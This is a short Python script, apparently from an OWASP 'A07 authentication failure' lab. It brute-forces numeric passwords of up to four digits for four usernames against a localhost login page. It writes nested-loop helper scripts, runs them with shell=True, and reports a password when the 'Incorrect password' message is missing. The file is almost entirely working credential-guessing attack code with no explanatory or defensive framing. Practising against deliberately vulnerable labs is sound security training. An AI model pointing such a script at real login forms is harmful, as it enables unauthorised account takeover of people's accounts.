import subprocess
# import requests

# temp = requests.post("http://localhost/A07-authenticationFailure/login.php", data={"username": "aaa", "password": "bbb"})
# print(temp.text)

characters = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
length = 4
usernames = ["bw", "px", "v4", "5d"]

for username in usernames:
  print(f"Cracking user {username}:")
  for i in range(0, length):
    loop = i+1
    f = open(f"loop{str(loop)}_pass.py", "w")
    f.writelines('import requests\n')
    f.writelines('characters = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]\n')
    indent = ""
    output = ""
    for j in range(0, loop):
      f.writelines(f"{indent}for {characters[j]} in characters:\n")
      indent += "  "
      output += characters[j] + "+"
    f.writelines(f"{indent}temp = requests.post('http://localhost/A07-authenticationFailure/login.php', data={{'username': '{username}', 'password': {output[:-1]}}})\n")
    f.writelines(f"{indent}if \"Incorrect password\" not in temp.text:\n")
    f.writelines(f"{indent}  print('Possible password: '+{output[:-1]})\n")
    f.writelines(f"{indent}  exit()")
#    f.writelines(f"{indent}  exit()\n")
#    f.writelines(f"{indent}print({output[:-1]})\n")
    f.close()

  for i in range(1, length+1):
#    print(i)
    print(subprocess.check_output(f"python3 loop{str(i)}_pass.py", shell=True).decode())
